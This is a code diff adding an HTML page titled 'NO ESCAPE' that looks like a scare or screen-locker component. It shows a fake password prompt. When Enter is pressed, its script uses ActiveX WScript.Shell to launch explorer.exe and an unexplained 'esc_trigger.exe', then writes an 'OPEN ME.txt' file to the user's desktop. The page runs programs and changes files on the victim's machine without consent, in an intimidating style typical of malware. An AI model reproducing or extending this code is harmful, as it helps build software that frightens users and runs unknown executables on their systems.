@@ -1,0 +1,40 @@
+<html>
+<head>
+    <title>NO ESCAPE</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: red;
+            font-family: monospace;
+            font-size: 24px;
+            text-align: center;
+            margin-top: 200px;
+        }
+        input {
+            background: black;
+            color: red;
+            border: none;
+            font-size: 24px;
+        }
+    </style>
+</head>
+<body>
+    <p>NO ESCAPE</p>
+    <p>Enter Password:</p>
+    <input type="password" id="pass" onkeydown="checkEnter(event)">
+    <script>
+        function checkEnter(e) {
+            if (e.key === "Enter") {
+                window.close();
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.Run("explorer.exe");
+                shell.Run("esc_trigger.exe");
+                var fso = new ActiveXObject("Scripting.FileSystemObject");
+                var file = fso.CreateTextFile(shell.ExpandEnvironmentStrings("%USERPROFILE%\\Desktop\\OPEN ME.txt"), true);
+                file.Write("NO ESCAPE!");
+                file.Close();
+            }
+        }
+    </script>
+</body>
+</html>
